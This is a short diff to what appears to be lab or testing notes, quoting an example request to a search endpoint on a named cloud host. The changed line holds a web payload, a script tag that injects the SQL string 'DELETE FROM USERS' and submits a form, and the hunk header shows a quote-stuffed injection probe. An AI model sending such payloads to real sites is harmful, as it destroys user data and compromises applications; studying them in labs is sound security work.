@@ -68,7 +68,7 @@ https://srijapx2.westus.cloudapp.azure.com/rest/products/search?q='''''''''''''U
 example:
 
 ```bash
-https://srijapx2.westus.cloudapp.azure.com/rest/products/search?q=<script>$('input').value="';DELETE FROM USERS;--";$('form').submit()</script>
+"https://srijapx2.westus.cloudapp.azure.com/rest/products/search?q=<script>$('input').value="';DELETE FROM USERS;--";$('form').submit()</script>"
 EOF
 ```
 
